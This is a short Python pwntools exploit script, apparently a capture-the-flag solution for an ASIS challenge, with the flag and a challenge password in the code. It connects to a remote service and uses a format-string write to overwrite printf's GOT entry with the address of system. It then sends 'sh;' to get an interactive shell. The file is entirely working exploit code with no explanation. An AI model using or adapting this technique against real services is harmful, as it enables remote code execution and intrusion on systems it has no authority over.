#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 8888
host = "146.185.132.36"
port = 12431
r = remote(host,port)

#ASIS{_ASIS_N3W_pwn_1S_goblin_pwn4b13!}
password = "7h15_15_v3ry_53cr37_1_7h1nk"
r.recvuntil(":")
r.sendline(password)
r.recvuntil("tion")
r.sendline("1")
r.recvuntil(":")
system = 0x400706
printf_got = 0x602040
context.arch = "amd64"
p = flat([printf_got,printf_got+1,printf_got+2,printf_got+3,printf_got+4,printf_got+5])
payload = ""
prev = 0
for i in range(6):
    payload += fmtchar(prev,(system >> i*8 ) &  0xff,40+i)
    prev = (system >> i*8 ) &  0xff
r.send(payload.ljust(255,"a") + "\x00"  + p)
r.recvuntil("tion")
r.sendline("1")
payload = "sh;"
r.send(payload.ljust(255,"a") + "\x00"  + p)
r.interactive()
